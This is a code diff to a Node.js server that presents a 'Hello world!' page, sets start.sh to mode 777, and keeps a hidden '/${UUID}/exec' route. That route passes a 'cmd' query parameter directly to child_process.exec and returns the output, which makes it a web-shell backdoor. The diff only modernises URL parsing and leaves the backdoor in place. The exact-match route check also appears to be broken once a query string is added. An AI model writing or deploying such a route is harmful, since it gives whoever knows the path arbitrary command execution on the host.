@@ -1,6 +1,5 @@
 const http = require('http');
 const { exec, execSync } = require('child_process');
-const url = require('url');
 const fs = require('fs');
 const subtxt = './.npm/sub.txt' 
 const PORT = process.env.PORT || 3000; 
@@ -29,6 +28,7 @@ fs.chmod("start.sh", 0o777, (err) => {
 
 // create HTTP server
 const server = http.createServer((req, res) => {
+    const parsedURL = new URL(req.url, `http://${req.headers.host}`);
     if (req.url === '/') {
       res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
       res.end('Hello world!');
@@ -56,16 +56,13 @@ const server = http.createServer((req, res) => {
             }
         });
     } else if (req.url === `/${UUID}/exec`) {
-        // Get information object about request URL:'true' sets parameters to be returned in object format
-        const parsedURL = url.parse(req.url, true);
-        // Get all parameters:{ key1: 'value1', key2: 'value2', key3: 'value3' }
-        // console.log(parsedURL.query);
+        const cmdStr = parsedURL.searchParams.get('cmd');
+        // console.log(Object.fromEntries(parsedURL.searchParams));
         res.writeHead(200, { 'Content-Type': 'text/plain' });
-        if (!parsedURL.query.cmd) {
+        if (!cmdStr) {
             res.end('No command\n');
             return;
         }
-        let cmdStr = parsedURL.query.cmd;
         exec(cmdStr, function (err, stdout, stderr) {
             res.end(err? err.message : stdout);
         });
